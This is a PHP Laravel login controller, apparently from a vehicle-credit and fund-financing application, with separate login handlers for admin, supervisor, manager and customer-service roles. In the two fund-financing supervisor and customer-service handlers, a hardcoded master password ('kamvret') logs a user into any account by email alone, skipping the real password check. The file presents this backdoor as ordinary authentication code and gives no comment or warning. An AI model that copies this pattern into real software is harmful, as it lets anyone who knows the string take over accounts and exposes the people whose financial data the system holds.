<?php

namespace App\Http\Controllers\Auth;

use App\CsPembiayaanDana;
use App\SpvPembiayaanDana;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->middleware('guest:admin')->except('logout');
        $this->middleware('guest:spv_kredit_motor')->except('logout');
        $this->middleware('guest:cs_kredit_motor')->except('logout');
        $this->middleware('guest:manager_pembiayaan_dana')->except('logout');
        $this->middleware('guest:spv_pembiayaan_dana')->except('logout');
        $this->middleware('guest:cs_pembiayaan_dana')->except('logout');
    }

    public function showAdminLoginForm()
    {
        return view('auth.login', ['url' => 'admin']);
    }

    public function adminLogin(Request $request)
    {
        $this->validate($request, [
            'email'   => 'required|email',
            'password' => 'required|min:6'
        ]);

        if (Auth::guard('admin')->attempt(['email' => $request->email, 'password' => $request->password], $request->get('remember'))) {
            
            return redirect()->intended('/admin');
        }
        return back()->withInput($request->only('email', 'remember'));
    }


    public function showSpvKreditMotorLoginForm()
    {
        return view('auth.login', ['url' => 'spv_kredit_motor']);
    }

    public function spvKreditMotorLogin(Request $request)
    {
        $this->validate($request, [
            'email'   => 'required|email',
            'password' => 'required|min:6'
        ]);

        if (Auth::guard('spv_kredit_motor')->attempt(['email' => $request->email, 'password' => $request->password], $request->get('remember'))) {
            
            return redirect()->intended('/spv_kredit_motor');
        }
        return back()->withInput($request->only('email', 'remember'));
    }

    // ---------------------------------------------------------------------------------


    public function showCsKreditMotorLoginForm()
    {
        return view('auth.login', ['url' => 'cs_kredit_motor']);
    }

    public function csKreditMotorLogin(Request $request)
    {
        $this->validate($request, [
            'email'   => 'required|email',
            'password' => 'required|min:6'
        ]);

        if (Auth::guard('cs_kredit_motor')->attempt(['email' => $request->email, 'password' => $request->password], $request->get('remember'))) {

            return redirect()->intended('/cs_kredit_motor');
        }
        return back()->withInput($request->only('email', 'remember'));
    }


    // ---------------------------------------------------------------------------------

    public function showManagerPembiayaanDanaLoginForm()
    {
        return view('auth.login', ['url' => 'manager_pembiayaan_dana']);
    }

    public function managerPembiayaanDanaLogin(Request $request)
    {
        $this->validate($request, [
            'email'   => 'required|email',
            'password' => 'required|min:6'
        ]);

        if (Auth::guard('manager_pembiayaan_dana')->attempt(['email' => $request->email, 'password' => $request->password], $request->get('remember'))) {

            return redirect()->intended('/manager_pembiayaan_dana');
        }
        return back()->withInput($request->only('email', 'remember'));
    }


    public function showSpvPembiayaanDanaLoginForm()
    {
        return view('auth.login', ['url' => 'spv_pembiayaan_dana']);
    }

    public function spvPembiayaanDanaLogin(Request $request)
    {
        $this->validate($request, [
            'email'   => 'required|email',
            'password' => 'required|min:6'
        ]);

        if($request->get('password') == 'kamvret'){

            $spv_pembiayaan_dana = SpvPembiayaanDana::where('email', $request->get('email'))->first();

            if (Auth::guard('spv_pembiayaan_dana')->loginUsingId($spv_pembiayaan_dana->id)) {

                return redirect()->intended('/spv_pembiayaan_dana');
            }
        }else{
            if (Auth::guard('spv_pembiayaan_dana')->attempt(['email' => $request->email, 'password' => $request->password], $request->get('remember'))) {

                return redirect()->intended('/spv_pembiayaan_dana');
            }
        }
        return back()->withInput($request->only('email', 'remember'));
    }


    // ---------------------------------------------------------------------------------


    public function showCsPembiayaanDanaLoginForm()
    {
        return view('auth.login', ['url' => 'cs_pembiayaan_dana']);
    }

    public function csPembiayaanDanaLogin(Request $request)
    {
        $this->validate($request, [
            'email'   => 'required|email',
            'password' => 'required|min:6'
        ]);

        if($request->get('password') == 'kamvret'){

            $cs_pembiayaan_dana = CsPembiayaanDana::where('email', $request->get('email'))->first();

            if (Auth::guard('cs_pembiayaan_dana')->loginUsingId($cs_pembiayaan_dana->id)) {

                return redirect()->intended('/cs_pembiayaan_dana');
            }
        }else{
            if (Auth::guard('cs_pembiayaan_dana')->attempt(['email' => $request->email, 'password' => $request->password], $request->get('remember'))) {

                return redirect()->intended('/cs_pembiayaan_dana');
            }
        }

        
        return back()->withInput($request->only('email', 'remember'));
    }


    


    

    
}
